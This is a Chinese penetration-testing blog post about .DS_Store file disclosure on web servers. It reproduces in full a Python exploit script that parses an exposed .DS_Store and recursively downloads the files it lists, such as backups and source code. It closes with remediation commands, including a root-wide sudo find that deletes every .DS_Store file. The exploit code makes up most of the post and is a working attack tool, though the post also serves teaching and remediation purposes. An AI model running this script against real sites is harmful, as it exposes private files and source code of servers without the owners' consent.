---
layout:     post
title:      .DS_Store文件泄漏漏洞利用
subtitle:   渗透测试
date:       2020-11-11
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 渗透测试
---
## 0x00 漏洞说明
.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件，将造成严重危害。
## 0x01 漏洞利用
https://github.com/lijiejie/ds_store_exp
这是一个 .DS_Store 文件泄漏利用脚本，它解析.DS_Store文件并递归地下载文件到本地。
```
Usage: python ds_store_exp.py http://www.example.com/.DS_Store
```
代码如下：
```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-
# LiJieJie    my[at]lijiejie.com    http://www.lijiejie.com

import sys
import urllib2
import cStringIO
import urlparse
import os
import Queue
import ssl
import threading
from ds_store import DSStore

context = ssl._create_unverified_context()


class Scanner(object):
    def __init__(self, start_url):
        self.queue = Queue.Queue()
        self.queue.put(start_url)
        self.processed_url = set()
        self.lock = threading.Lock()
        self.working_thread = 0

    def process(self):
        while True:
            try:
                url = self.queue.get(timeout=2.0)
                self.lock.acquire()
                self.working_thread += 1
                self.lock.release()
            except Exception as e:
                if self.working_thread == 0:
                    break
                else:
                    continue
            try:
                if url in self.processed_url:
                    pass
                else:
                    self.processed_url.add(url)
                base_url = url.rstrip('.DS_Store')
                if not url.lower().startswith('http'):
                    url = 'http://%s' % url
                schema, netloc, path, _, _, _ = urlparse.urlparse(url, 'http')
                try:
                    response = urllib2.urlopen(url, context=context)
                except Exception, e:
                    if e.code != 404:
                        self.lock.acquire()
                        print '[%s] %s' % (e.code, url)
                        self.lock.release()
                    continue

                data = response.read()

                if response.code == 200:
                    folder_name = netloc.replace(':', '_') + '/'.join(path.split('/')[:-1])
                    if not os.path.exists(folder_name):
                        os.makedirs(folder_name)
                    with open(netloc.replace(':', '_') + path, 'wb') as outFile:
                        self.lock.acquire()
                        print '[%s] %s' % (response.code, url)
                        self.lock.release()
                        outFile.write(data)
                    if url.endswith('.DS_Store'):
                        ds_store_file = cStringIO.StringIO()
                        ds_store_file.write(data)
                        d = DSStore.open(ds_store_file)

                        dirs_files = set()
                        for x in d._traverse(None):
                            dirs_files.add(x.filename)
                        for name in dirs_files:
                            if name != '.':
                                self.queue.put(base_url + name)
                                self.queue.put(base_url + name + '/.DS_Store')
                        d.close()
            except Exception as e:
                self.lock.acquire()
                print '[!] %s' % str(e)
                self.lock.release()
            finally:
                self.working_thread -= 1

    def scan(self):
        all_threads = []
        for i in range(10):
            t = threading.Thread(target=self.process)
            all_threads.append(t)
            t.start()


if __name__ == '__main__':
    if len(sys.argv) == 1:
        print 'A .DS_Store file disclosure exploit.'
        print 'It parses .DS_Store and downloads file recursively.'
        print
        print '    Usage: python ds_store_exp.py http://www.example.com/.DS_Store'
        sys.exit(0)
    s = Scanner(sys.argv[1])
    s.scan()
```
## 0x02 漏洞修复
### 1.禁止.DS_Store生成
打开 “终端”，执行下列命令，重启Mac生效：
```
defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE
```
### 2.删除现有的.DS_Store
对已经生成的文件还需要你手动删除：
```
sudo find / -name ".DS_Store" -depth -exec rm {} \;
```
### 3.恢复.DS_Store生成
```
defaults delete com.apple.desktopservices DSDontWriteNetworkStores
```